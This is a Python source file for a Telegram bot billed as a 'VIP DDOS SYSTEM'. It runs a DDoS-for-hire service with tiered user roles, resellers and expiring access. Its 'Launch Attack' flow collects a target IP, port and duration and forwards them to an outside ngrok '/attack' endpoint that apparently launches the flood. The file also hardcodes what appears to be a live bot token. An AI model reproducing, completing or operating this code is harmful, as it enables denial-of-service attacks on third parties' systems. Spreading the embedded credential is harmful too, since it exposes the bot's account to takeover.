import os
import json
import logging
import threading
import time
import random
import string
import requests
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from github import Github, GithubException
from flask import Flask
from threading import Thread

# Logging & Flask Setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
app = Flask('')
@app.route('/')
def home(): return "Bot is Live!"
def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- CONFIGURATION ---
BOT_TOKEN = "8748437919:AAEI0zQ_-0Umg0wqFAbIvCqF9xjssceudo0"
ADMIN_IDS = [7529105228]
COLAB_API_URL = "https://bubble-sponge-unpicked.ngrok-free.dev/attack"

# --- GLOBAL DATA ---
current_attack = None
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
temp_data = {}

# --- JSON HELPERS ---
def load_json(file, default):
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return default

def save_json(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=2)

approved_users = load_json('approved_users.json', {})
owners = load_json('owners.json', {str(ADMIN_IDS[0]): {"username": "admin", "is_primary": True}})
admins = load_json('admins.json', {})
resellers = load_json('resellers.json', {})
github_tokens = load_json('github_tokens.json', [])
user_attack_counts = load_json('user_attack_counts.json', {})

# --- ROLE CHECKS ---
def is_owner(uid): return str(uid) in owners
def is_admin(uid): return str(uid) in admins
def is_reseller(uid): return str(uid) in resellers
def is_approved(uid):
    u = str(uid)
    if u in approved_users:
        if approved_users[u]['expiry'] == "LIFETIME": return True
        return time.time() < approved_users[u]['expiry']
    return False

# --- KEYBOARDS (ORIGINAL DESIGN) ---
def get_main_keyboard(uid):
    kb = [[KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Check Status")],
          [KeyboardButton("🛑 Stop Attack"), KeyboardButton("🔐 My Access")]]
    if is_owner(uid) or is_admin(uid): kb.append([KeyboardButton("👥 User Management"), KeyboardButton("⚙️ Bot Settings")])
    if is_owner(uid): kb.append([KeyboardButton("👑 Owner Panel"), KeyboardButton("🔑 Token Management")])
    kb.append([KeyboardButton("❓ Help")])
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def get_user_mgmt_kb():
    return ReplyKeyboardMarkup([["➕ Add User", "➖ Remove User"], ["📋 Users List", "⏳ Pending Requests"], ["« Back to Main Menu"]], resize_keyboard=True)

def get_owner_kb():
    return ReplyKeyboardMarkup([["👑 Add Owner", "🗑️ Remove Owner"], ["📢 Broadcast Message", "💰 Resellers List"], ["« Back to Main Menu"]], resize_keyboard=True)

# --- CORE ATTACK TRIGGER ---
def trigger_colab(ip, port, duration):
    try: requests.get(COLAB_API_URL, params={'host': ip, 'port': port, 'time': duration}, timeout=2)
    except: pass

# --- HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await update.message.reply_text("🤖 **VIP DDOS SYSTEM RESTORED**\nSelect an option:", reply_markup=get_main_keyboard(uid))

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text

    if text == "« Back to Main Menu":
        await update.message.reply_text("🏠 Main Menu", reply_markup=get_main_keyboard(uid))
    
    elif text == "🎯 Launch Attack":
        if not (is_approved(uid) or is_owner(uid)): 
            await update.message.reply_text("❌ No Access!")
            return
        temp_data[uid] = {"step": "ip"}
        await update.message.reply_text("🎯 **ATTACK**\nSend Target IP:", reply_markup=ReplyKeyboardMarkup([["❌ Cancel"]], resize_keyboard=True))

    elif text == "👥 User Management":
        if is_owner(uid) or is_admin(uid):
            await update.message.reply_text("👥 User Management Menu", reply_markup=get_user_mgmt_kb())

    elif text == "👑 Owner Panel":
        if is_owner(uid):
            await update.message.reply_text("👑 Owner Menu", reply_markup=get_owner_kb())

    elif text == "❌ Cancel":
        if uid in temp_data: del temp_data[uid]
        await update.message.reply_text("❌ Cancelled.", reply_markup=get_main_keyboard(uid))

    elif uid in temp_data:
        step = temp_data[uid].get("step")
        if step == "ip":
            temp_data[uid].update({"ip": text, "step": "port"})
            await update.message.reply_text("✅ IP Set. Send Port:")
        elif step == "port":
            temp_data[uid].update({"port": text, "step": "time"})
            await update.message.reply_text("✅ Port Set. Send Duration (s):")
        elif step == "time":
            ip, port = temp_data[uid]["ip"], temp_data[uid]["port"]
            trigger_colab(ip, port, text)
            del temp_data[uid]
            await update.message.reply_text(f"🚀 **ATTACK STARTED!**\nTarget: `{ip}:{port}`\nTime: `{text}s`", reply_markup=get_main_keyboard(uid))

# --- MAIN ---
def main():
    keep_alive()
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("🤖 BOT RESTORED & LIVE")
    application.run_polling()

if __name__ == '__main__': main()
